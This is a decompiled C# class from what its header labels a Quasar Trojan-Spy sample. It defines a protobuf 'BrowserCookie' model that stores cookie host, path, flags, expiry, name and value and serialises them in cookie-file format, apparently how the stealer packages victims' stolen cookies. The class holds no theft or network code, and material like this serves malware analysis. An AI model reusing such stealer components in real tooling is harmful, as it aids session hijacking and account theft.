// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.Common.BrowserCookie
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using ProtoBuf;
using System.Collections.Generic;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
  [ProtoContract(Name = "BrowserCookie")]
  public class BrowserCookie : INotifyPropertyChanged, IEqualityComparer<BrowserCookie>
  {
    private string _value;
    private string _name;
    private string _expires;
    private bool _secure;
    private string _path;
    private bool _http;
    private string _host;

    [ProtoMember(1, Name = "Host")]
    public string Host
    {
      get => this._host;
      set
      {
        this._host = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Host)));
      }
    }

    [ProtoMember(2, Name = "Http")]
    public bool Http
    {
      get => this._http;
      set
      {
        this._http = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Http)));
      }
    }

    [ProtoMember(3, Name = "Path")]
    public string Path
    {
      get => this._path;
      set
      {
        this._path = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Path)));
      }
    }

    [ProtoMember(4, Name = "Secure")]
    public bool Secure
    {
      get => this._secure;
      set
      {
        this._secure = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Secure)));
      }
    }

    [ProtoMember(5, Name = "Expires")]
    public string Expires
    {
      get => this._expires;
      set
      {
        this._expires = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Expires)));
      }
    }

    [ProtoMember(6, Name = "Name")]
    public string Name
    {
      get => this._name;
      set
      {
        this._name = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Name)));
      }
    }

    [ProtoMember(7, Name = "Value")]
    public string Value
    {
      get => this._value;
      set
      {
        this._value = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Value)));
      }
    }

    public event PropertyChangedEventHandler PropertyChanged;

    public override string ToString() => string.Join("\t", new string[7]
    {
      this.Host,
      this.Http.ToString().ToUpper(),
      this.Path,
      this.Secure.ToString().ToUpper(),
      this.Expires,
      this.Name,
      this.Value
    });

    public bool Equals(BrowserCookie x, BrowserCookie y) => x.Name == y.Name && x.Host == y.Host && x.Path == y.Path && x.Value == y.Value;

    public int GetHashCode(BrowserCookie obj)
    {
      int hashCode = 37 * 397;
      if (!string.IsNullOrEmpty(obj.Name))
        hashCode += obj.Name.GetHashCode();
      if (!string.IsNullOrEmpty(obj.Host))
        hashCode += obj.Host.GetHashCode();
      if (!string.IsNullOrEmpty(obj.Path))
        hashCode += obj.Path.GetHashCode();
      if (!string.IsNullOrEmpty(obj.Value))
        hashCode += obj.Value.GetHashCode();
      return hashCode;
    }
  }
}
